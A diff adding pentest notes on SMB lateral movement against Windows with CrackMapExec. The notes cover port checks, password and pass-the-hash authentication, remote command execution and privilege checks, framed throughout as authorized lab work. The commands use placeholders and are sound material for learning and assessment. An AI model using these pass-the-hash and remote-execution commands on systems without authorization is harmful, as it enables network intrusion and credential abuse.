@@ -1,0 +1,174 @@
+============================================================
+          SMB LATERAL MOVEMENT - WINDOWS LAN
+               "NUKE" PROTOCOL NOTES
+============================================================
+
+OVERVIEW
+------------------------------------------------------------
+
+Technique:
+SMB Lateral Movement via CrackMapExec (CME)
+
+Authentication methods:
+- Password-based authentication
+- Pass-the-Hash (NTLM)
+
+SMB Port: 445
+Target OS: Windows
+Attacking OS: Linux / Kali Linux
+
+Purpose:
+Authorized SMB security assessment and remote command
+execution in a controlled Windows LAN lab.
+
+
+STEP 1: CONFIRM TARGET & OPEN SMB PORT
+------------------------------------------------------------
+
+Verify that the target is online and SMB (445) is open.
+
+# Verify SMB port
+nmap -p 445 <TARGET_IP>
+
+If port 445 is OPEN, SMB is reachable.
+
+NOTE:
+An open port does not establish that authentication or
+remote command execution will succeed.
+
+
+STEP 2: SMB AUTHENTICATION TESTING
+------------------------------------------------------------
+
+Tool: CrackMapExec (CME)
+
+Assumption:
+You know the authorized test username, e.g., JohnDoe.
+
+# Test SMB authentication with an authorized credential
+cme smb <TARGET_IP> -u JohnDoe -p '<PASSWORD>' --local-auth
+
+OPTIONS EXPLAINED:
+
+-u JohnDoe
+    Specifies the Windows username.
+
+-p <PASSWORD>
+    Specifies the password.
+
+--local-auth
+    Uses local account authentication rather than
+    domain authentication.
+
+
+STEP 3: PASS-THE-HASH (NTLM)
+------------------------------------------------------------
+
+If you possess an NTLM hash from an authorized lab,
+you can test hash-based authentication.
+
+# Replace <NTLM_HASH> with the actual NTLM hash
+cme smb <TARGET_IP> -u JohnDoe -H <NTLM_HASH> --local-auth
+
+-H
+    Specifies the NTLM hash instead of a plaintext password.
+
+
+STEP 4: VERIFY AUTHENTICATED ACCESS
+------------------------------------------------------------
+
+After successful authentication, verify the account identity.
+
+# Execute an identity verification command
+cme smb <TARGET_IP> -u JohnDoe -p '<PASSWORD>' --local-auth -x 'whoami'
+
+# Execute additional system information commands
+cme smb <TARGET_IP> -u JohnDoe -p '<PASSWORD>' --local-auth -x 'ipconfig'
+
+NOTE:
+Successful authentication does not automatically mean
+administrator or SYSTEM privileges.
+
+
+STEP 5: PRIVILEGE ASSESSMENT
+------------------------------------------------------------
+
+Check the privileges of the authenticated account.
+
+# Check current identity
+whoami
+
+# Check group memberships
+whoami /groups
+
+# Check current user privileges
+whoami /priv
+
+IMPORTANT:
+A standard Windows user cannot automatically elevate to
+SYSTEM through SMB.
+
+Privilege escalation requires a separate, authorized
+assessment of the target's security configuration.
+
+
+STEP 6: ADMINISTRATIVE ACCESS VERIFICATION
+------------------------------------------------------------
+
+In an authorized lab, verify whether the account has
+administrative privileges before testing remote
+administrative functionality.
+
+# Check administrative group membership
+net localgroup administrators
+
+# Check current identity
+whoami
+
+NOTE:
+Do not modify user accounts, reset passwords, create
+administrative accounts, or change group memberships
+without explicit authorization.
+
+
+============================================================
+          ONE-COMMAND AUTHENTICATION SUMMARY
+============================================================
+
+# Verify SMB authentication using authorized credentials
+
+cme smb <TARGET_IP> -u JohnDoe -p '<PASSWORD>' --local-auth
+
+# Verify remote command execution (if authorized)
+
+cme smb <TARGET_IP> -u JohnDoe -p '<PASSWORD>' --local-auth -x 'whoami'
+
+
+============================================================
+                 IMPORTANT NOTES
+============================================================
+
+1. SMB normally operates on TCP port 445.
+
+2. An open SMB port does not guarantee access.
+
+3. CrackMapExec supports SMB authentication testing.
+
+4. Pass-the-Hash requires a valid NTLM hash.
+
+5. Remote command execution generally requires
+   appropriate administrative privileges.
+
+6. SYSTEM is a Windows security context, not simply
+   another ordinary user account.
+
+7. Account creation and privilege modification require
+   explicit authorization.
+
+8. Perform all testing only on machines you own or have
+   explicit permission to assess.
+
+
+============================================================
+                    END OF NOTES
+============================================================
